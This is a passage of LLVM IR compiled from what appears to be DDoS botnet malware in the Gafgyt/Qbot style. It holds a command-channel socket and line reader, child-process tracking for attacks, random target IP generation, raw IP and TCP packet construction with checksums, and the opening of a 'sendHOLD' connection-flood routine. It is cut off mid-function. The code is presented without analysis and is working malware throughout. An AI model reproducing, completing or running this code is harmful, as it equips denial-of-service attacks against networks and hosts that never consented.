  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #10
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #10
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %88

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %83, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %87

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = call i32 (i32, i8*, ...) @sockprintf(i32 %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0))
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  br label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #2, !srcloc !3
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  br label %67

; <label>:67:                                     ; preds = %58
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %67
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %13, align 4
  br label %50

; <label>:86:                                     ; preds = %67
  br label %87

; <label>:87:                                     ; preds = %86, %50
  br label %88

; <label>:88:                                     ; preds = %87, %33
  store i32 0, i32* %18, align 4
  %89 = load i8*, i8** %6, align 8
  store i8* %89, i8** %17, align 8
  br label %90

; <label>:90:                                     ; preds = %108, %88
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, -1
  store i32 %92, i32* %7, align 4
  %93 = icmp sgt i32 %91, 1
  br i1 %93, label %94, label %111

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i64 @recv(i32 %95, i8* %16, i64 1, i32 0)
  %97 = icmp ne i64 %96, 1
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = load i8*, i8** %17, align 8
  store i8 0, i8* %99, align 1
  store i32 -1, i32* %4, align 4
  br label %114

; <label>:100:                                    ; preds = %94
  %101 = load i8, i8* %16, align 1
  %102 = load i8*, i8** %17, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %17, align 8
  store i8 %101, i8* %102, align 1
  %104 = load i8, i8* %16, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 10
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %18, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %18, align 4
  br label %90

; <label>:111:                                    ; preds = %107, %90
  %112 = load i8*, i8** %17, align 8
  store i8 0, i8* %112, align 1
  %113 = load i32, i32* %18, align 4
  store i32 %113, i32* %4, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %98
  %115 = load i32, i32* %4, align 4
  ret i32 %115
}

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #2
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %256

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = add nsw i32 %47, %48
